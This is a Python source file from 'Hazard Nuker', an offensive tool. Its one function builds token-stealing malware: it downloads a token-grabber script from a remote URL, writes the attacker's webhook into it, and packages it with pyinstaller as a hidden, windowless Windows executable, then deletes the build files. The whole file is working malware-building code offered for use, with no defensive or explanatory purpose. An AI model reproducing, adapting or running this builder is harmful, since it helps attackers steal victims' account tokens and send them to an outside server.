# Hazard was proudly coded by Rdimo (https://github.com/Rdimo).
# Hazard Nuker under the GNU General Public Liscense v2 (1991).

import os
import shutil
import Hazard

from urllib.request import urlopen
from colorama import Fore

def TokenGrabberV2(WebHook, fileName):
    with open("requirements.cmd", "w") as f:
        f.write("pip install requests psutil pywin32 pycryptodome pyautogui opencv-python numpy")
        f.close()
    os.startfile(os.getcwd()+"\\requirements.cmd")
    os.remove(os.getcwd()+"\\requirements.cmd")
    print(f"{Fore.RED}\nCreating {fileName}.exe\n{Fore.RESET}")
    try:
        f = urlopen("https://raw.githubusercontent.com/Rdimo/Hazard-Token-Grabber-V2/master/main.py")
        filecontent = f.read()
        with open(f"{fileName}.py", 'wb') as f:
            f.write(filecontent)
        with open(f"{fileName}.py", 'r+') as f:
            replace_string = f.read().replace("WEBHOOK_HERE", WebHook)
        with open(f"{fileName}.py", 'w'): pass
        with open(f"{fileName}.py", 'r+') as f:
            f.write(replace_string)

        os.system(f"pyinstaller {fileName}.py --onefile --noconsole --log-level=INFO -i NONE -n {fileName}")
        shutil.move(f"{os.getcwd()}\\dist\\{fileName}.exe", f"{os.getcwd()}\\{fileName}.exe")
        shutil.rmtree('build')
        shutil.rmtree('dist')
        shutil.rmtree('__pycache__')
        os.remove(f'{fileName}.spec')
        os.remove(f'{fileName}.py')

    except Exception as e:
        print(f"{Fore.RED}Error while making exe: {e}")
        try:
            shutil.rmtree('build')
            shutil.rmtree('dist')
            shutil.rmtree('__pycache__')
            os.remove(f'{fileName}.spec')
            os.remove(f'{fileName}.py')
        except FileNotFoundError:
            pass
    else:
        print(f"\n{Fore.GREEN}File created as {fileName}.exe\n")
    input(f'{Fore.GREEN}[{Fore.YELLOW}>>>{Fore.GREEN}] {Fore.RESET}Enter anything to continue . . .  {Fore.LIGHTRED_EX}')
    Hazard.main()